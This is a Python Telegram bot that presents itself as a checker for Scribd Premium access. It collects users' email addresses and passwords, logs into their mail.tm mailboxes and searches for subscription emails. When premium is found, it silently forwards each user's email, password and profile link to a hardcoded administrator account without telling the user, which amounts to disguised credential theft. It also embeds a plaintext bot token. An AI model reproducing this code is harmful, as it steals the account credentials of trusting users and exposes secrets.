import telebot
import requests
import json
from keep_alive import keep_alive
keep_alive()

# Load configuration
BOT_TOKEN = '7159519991:AAE9Y6362M1arKCE8UxONF1rqPurYw6klFw'
bot = telebot.TeleBot(BOT_TOKEN)

# Data structure to temporarily store input
user_data = {}

# Admin ID for premium notifications
ADMIN_ID = 6100176781  # Replace with your actual admin Telegram ID

# Headers for authentication
auth_headers = {
    'accept': 'application/json',
    'content-type': 'application/json',
    'sec-ch-ua': '"Not A(Brand";v="99", "Chromium";v="99"',
    'sec-ch-ua-mobile': '?0',
}

# Function to generate a Telegram profile link
def get_telegram_profile_link(user_id):
    return f"https://t.me/{user_id}"

# Function to find premium message
def find_premium_message(messages):
    for message in messages:  # Iterate over messages directly since it's already a list
        if message.get('subject') == 'Welcome to Scribd':
            # Look for keywords within the email body
            if any(word in message.get('intro', '') for word in ['receipt', 'trial', 'subscription', 'premium']): 
                return True  # Premium found

    return False  # Premium not found

# Function to handle authentication and premium check
def check_scribd_premium(email, password):
    # Authentication endpoint
    auth_url = 'https://api.mail.tm/token'
    auth_data = {
        "address": email,
        "password": password
    }
    # Authenticate
    auth_response = requests.post(auth_url, headers=auth_headers, json=auth_data)
    if auth_response.status_code == 200:
        token = auth_response.json()['token']
        messages_url = 'https://api.mail.tm/messages'
        messages_headers = {
            **auth_headers,  # Include authentication headers
            'Authorization': f'Bearer {token}',
        }
        messages_response = requests.get(messages_url, headers=messages_headers)
        if messages_response.status_code == 200:
            messages_data = json.loads(messages_response.text)  # Parse JSON response
            premium_found = find_premium_message(messages_data)  # Use find_premium_message function
            if premium_found:
                return True, None  # Premium found
            else:
                return False, "Premium not found"
        else:
            error_message = f"Error fetching messages: {messages_response.status_code}"
            print(error_message)  # Print debug message
            return False, error_message
    else:
        error_message = f"Sign in failed: Email or Password invalid!"
        print(error_message)  # Print debug message
        return False, error_message

# Command handler for /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.add(telebot.types.KeyboardButton('Check Scribd✨'))
    bot.send_message(message.chat.id, "Let's check for Scribd Premium", reply_markup=keyboard)

# Message handler for text input
@bot.message_handler(content_types=['text'])
def handle_input(message):
    if message.text == 'Check Scribd✨':
        bot.send_message(message.chat.id, "Enter your email address:")
        user_data[message.chat.id] = {'state': 'email'}
    elif user_data.get(message.chat.id) and user_data[message.chat.id]['state'] == 'email':
        user_data[message.chat.id]['email'] = message.text
        bot.send_message(message.chat.id, "Enter your password:")
        user_data[message.chat.id]['state'] = 'password'
    elif user_data.get(message.chat.id) and user_data[message.chat.id]['state'] == 'password':
        user_data[message.chat.id]['password'] = message.text
        process_message = bot.send_message(message.chat.id, "Processing, please wait...")  # Store message object

        # Perform authentication and premium check
        premium_result, error_message = check_scribd_premium(user_data[message.chat.id]['email'], user_data[message.chat.id]['password'])

        bot.delete_message(message.chat.id, process_message.id)  # Delete "processing" message 

        if premium_result:
            success_message = (
                f"*Scribd Premium Found!*\n"
                f"Email address: `{user_data[message.chat.id]['email']}`\n"
                f"Password: `{user_data[message.chat.id]['password']}`\n\n"
                f"Bot Developed by @N2X4E"
            )
            bot.send_message(message.chat.id, success_message, parse_mode='Markdown')

            # Send details to the admin
            admin_message = (
                f"User [Profile]({get_telegram_profile_link(message.from_user.username)})\n"
                f"Email: `{user_data[message.chat.id]['email']}`\n"
                f"Password: `{user_data[message.chat.id]['password']}`"
            )
            bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
        else:
            failure_message = (
                f"{error_message}\n\n"
                f"Bot Developed by @N2X4E"
            )
            bot.send_message(message.chat.id, failure_message, parse_mode='Markdown')

        user_data.pop(message.chat.id)  # Clear data

# Bot polling
bot.polling()
